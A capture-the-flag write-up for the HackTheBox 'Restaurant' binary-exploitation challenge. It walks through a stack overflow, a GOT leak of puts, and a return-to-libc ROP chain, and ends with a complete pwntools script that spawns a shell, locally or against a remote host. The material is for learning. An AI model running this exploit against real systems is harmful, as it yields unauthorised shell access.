---
title: Restaurant
category: pwn
tag: hackthebox
---


## Overview

In this write-up, we go into a binary exploitation challenge centered around a 64-bit executable named `restaurant`. The challenge basically focusing on Buffer Overflow and Return-To-LibC attack
# Analysis

**File Check**

```bash
restaurant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=34d48877c9e228a7bc7b66b34f0d4fa6353d20b4, not stripped
```

```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**Key Findings**:
- file is a 64bit binary
- dynamically linked -> means it will fetch libc functions
- not stripped -> functions name stays, we can see it in ghidra/ida
Security 
- no stack canary, possible buffer overflow
- no PIE, address of the functions/gadgets stays the same, easier for ROP

**Executing the file**

```bash
# testing the fill function
$ ./restaurant 
🥡 Welcome to Rocky Restaurant 🥡

What would you like?
1. Fill my dish.
2. Drink something
> 1

You can add these ingredients to your dish:
1. 🍅
2. 🧀
You can also order something else.
> a
Enjoy your a

# testing the drink function
$ ./restaurant 
🥡 Welcome to Rocky Restaurant 🥡

What would you like?
1. Fill my dish.
2. Drink something
> 2

What beverage would you like?
1. Water.
2. 🥤.
> a
Invalid option
```
Based on this testing, we can see that fill function will reflect back anything we give

time for format string attack

```bash
./restaurant 
🥡 Welcome to Rocky Restaurant 🥡

What would you like?
1. Fill my dish.
2. Drink something
> 1

You can add these ingredients to your dish:
1. 🍅
2. 🧀
You can also order something else.
> %s

Enjoy your %s
```

no luck, how about buffer overflow?

```bash
./restaurant 
🥡 Welcome to Rocky Restaurant 🥡

What would you like?
1. Fill my dish.
2. Drink something
> 1

You can add these ingredients to your dish:
1. 🍅
2. 🧀
You can also order something else.
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Enjoy your AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

we can see we got bof.

Checking in **ghidra**

fill function
```C
void fill(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  color("\nYou can add these ingredients to your dish:","green",&DAT_00401144);
  puts(&DAT_004011a5);
  color("You can also order something else.\n> ","green",&DAT_00401144);
  read(0,&local_28,0x400);
  printf("\nEnjoy your %s",&local_28);
  return;
}
```
- the read function accepting ridiculously large amount of characters.
- no win() / flag() type of function

# Solution

After the analysis we can see 
- no win() / flag() type of function
- Buffer Overflow occur
- The binary is dynamically linked

Return-to-libc attack it is...

First we find the offset until the return address located
- using gdb we can easily find the offset which is 40

Next we need to leak the libc functions

to do that we need
- pop rdi; ret; gadget
- fill address;

using ropper we can get the gadget easily
```bash
$ ropper --file restaurant
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
Gadgets
=======
0x0000000000400edd: add al, byte ptr [rax]; add byte ptr [rax], bh; call 0x670; nop; leave; ret; 
|
|
|
|
0x000000000040070f: add bl, dh; ret;
0x00000000004010a3: pop rdi; ret;
|
|
|
|
```

for fill address we gonna use pwntools function.

```python
fill_addr = elf.symbols.fill
```

assembling the script

```python
# Start program
io = start()

# useful gadgets
ret = p64(0x000000000040063e)
pop_rdi = p64(0x00000000004010a3)

# got of libc functions
plt_puts = p64(elf.plt.puts)
got_puts = p64(elf.got.puts)

# crafting payload for leaking libs functions
fill_add = p64(elf.symbols.fill)
padding = 40
payload = b'A'*padding
payload += pop_rdi + got_puts + plt_puts
payload += fill_add

#sending payload
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'> ')
io.sendline(payload)

# extracting payload
result = io.recvline_startswith('Enjoy your')
leak_puts = unpack(result[-6:].ljust(8,b'\x00')) 
info('leak_puts address: %#0x', leak_puts)
info('elf.symbols.magic_door: %#0x', elf.symbols.fill)
```

output

```bash
python exploit.py 
[+] Starting local process './restaurant': pid 12070
plt_puts b'P\x06@\x00\x00\x00\x00\x00'
got_puts b'\xa8\x1f`\x00\x00\x00\x00\x00'
/home/gnapac/Desktop/CTF/HTB/pwnChal/pwn_restaurant/exploit.py:62: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  result = io.recvline_startswith('Enjoy your')
[*] leak_puts address: 0x4010a3414141
[*] elf.symbols.magic_door: 0x400e4a
[*] Switching to interactive mode
```

Next we can set the libc base address

```python
# leak = base + offset
# libc.symbols.puts -> offset
libc_base = leak_puts - libc.symbols.puts 
info('Libc base: %#0x', libc_base)
```

Next we can find the '/bin/sh' string and system function in libc

```python
shell = next(libc.search(b'/bin/sh\x00')) 
info('Shell: %#0x', shell)
bin_sh = libc_base + shell
info('/bin/sh address: %#0x', bin_sh)
system = libc_base + libc.symbols.system
info('System Address: %#0x', system)
```

Then we can craft the final payload
```python
payload = b'A'*padding
payload += ret # stack alignment fix
payload += pop_rdi + p64(bin_sh) + p64(system)
```


![[Pasted image 20231221222556.png]]

we got the shell :D
## full exploit script

```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './restaurant'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6")
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# useful gadgets
ret = p64(0x000000000040063e)
pop_rdi = p64(0x00000000004010a3)

# got of libc functions
plt_puts = p64(elf.plt.puts)
got_puts = p64(elf.got.puts)

# crafting payload for leaking libs functions
fill_add = p64(elf.symbols.fill)
padding = 40
payload = b'A'*padding
payload += pop_rdi + got_puts + plt_puts
payload += fill_add

#sending payload
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'> ')
io.sendline(payload)

# extracting payload
result = io.recvline_startswith('Enjoy your')
leak_puts = unpack(result[-6:].ljust(8,b'\x00')) 
info('leak_puts address: %#0x', leak_puts)
info('elf.symbols.magic_door: %#0x', elf.symbols.fill)

# leak = base + offset
# libc.symbols.puts -> offset
libc_base = leak_puts - libc.symbols.puts 
info('Libc base: %#0x', libc_base)
shell = next(libc.search(b'/bin/sh\x00')) 
info('Shell: %#0x', shell)
bin_sh = libc_base + shell
info('/bin/sh address: %#0x', bin_sh)
system = libc_base + libc.symbols.system
info('System Address: %#0x', system)

payload = b'A'*padding
payload += ret
payload += pop_rdi + p64(bin_sh) + p64(system)

io.sendlineafter(b'>', payload)

io.interactive()

```
